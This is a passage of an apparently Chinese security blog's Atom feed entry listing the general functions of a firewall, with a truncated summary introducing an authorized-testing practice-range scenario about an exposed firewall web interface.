title="防火墙作用"></a>防火墙作用</h2><ul><li>保护脆弱的服务：过滤不安全服务，提高网络安全减少主机风险</li><li>控制对系统的访问</li><li>集中的安全管理：在防火墙定义的安全规则可以运行于整个内部网络系统，而无需在内部网每台机器上分别设立安全策略</li><li>增强的保密性：可以阻止攻击者获取攻击网络系统的有用信息</li><li>记录和统计网络利用数据以及非法使用数据</li><li>策略执行：提供了指定和执行网络安全策略的手段。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的W</summary>
      
    
    
    
    
    <category term="墨者学院，靶场，防火墙" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%8C%E9%9D%B6%E5%9C%BA%EF%BC%8C%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
</feed>
